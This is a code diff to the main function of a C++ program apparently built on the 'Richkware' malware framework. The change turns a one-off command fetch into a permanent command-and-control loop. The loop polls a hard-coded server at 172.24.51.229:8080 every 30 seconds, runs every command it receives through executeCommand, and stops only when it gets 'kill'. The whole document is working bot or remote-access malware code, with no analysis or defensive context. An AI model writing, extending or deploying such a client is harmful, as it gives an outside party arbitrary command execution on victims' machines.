@@ -17,15 +17,23 @@ int main() {
 //    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
 //    richkware.executeCommands();
     std::vector<std::string> commands = richkware.updateCommands("172.24.51.229", "8080", "");
-    if (!commands.empty()) {
+    while (true) {
+        while (commands.size() == 1 && commands.at(0) == "") {
+            commands = richkware.updateCommands("172.24.51.229", "8080", "");
+            std::cout << "waiting for commands..." << std::endl;
+            Sleep(30000);
+        }
+        std::cout << "commands found: " << commands.size() << std::endl;
         for (size_t i = 0; i < commands.size(); ++i) {
+            std::cout << "executing..." << commands.at(i) << std::endl;
+            if (commands.at(i) == "kill") {
+                return 0;
+            }
             richkware.executeCommand(commands.at(i));
-            commands = richkware.updateCommands("172.24.51.229", "8080", utils::concatVector(commands, "##"));
-            commands.pop_back();
+            //        commands = richkware.updateCommands("172.24.51.229", "8080", utils::concatVector(commands, "##"));
+            //        commands.pop_back();
         }
     }
-    return 0;
-
 }
 
 
